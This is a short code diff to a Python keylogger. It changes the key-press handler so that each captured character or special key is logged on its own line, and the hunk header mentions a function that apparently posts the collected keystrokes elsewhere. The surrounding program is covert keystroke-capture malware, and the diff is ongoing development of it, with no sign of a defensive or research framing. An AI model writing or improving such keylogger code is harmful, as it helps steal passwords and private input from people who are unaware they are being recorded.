@@ -46,11 +46,11 @@ def post_keystrokes():
 def on_press(key):
     global keystrokes
     try:
-        # For normal characters, we just append the character
-        key_str = key.char
+        # For normal characters, we just append the character with a new line
+        key_str = key.char + "\n"
     except AttributeError:
         # For special keys, we use the dictionary to map to a human-readable name
-        key_str = special_keys.get(key, str(key))  # Use the name from the dictionary if available
+        key_str = special_keys.get(key, str(key)) + "\n"  # Add new line after special keys as well
 
     # Append the key press to the keystrokes string
     with keystroke_lock:
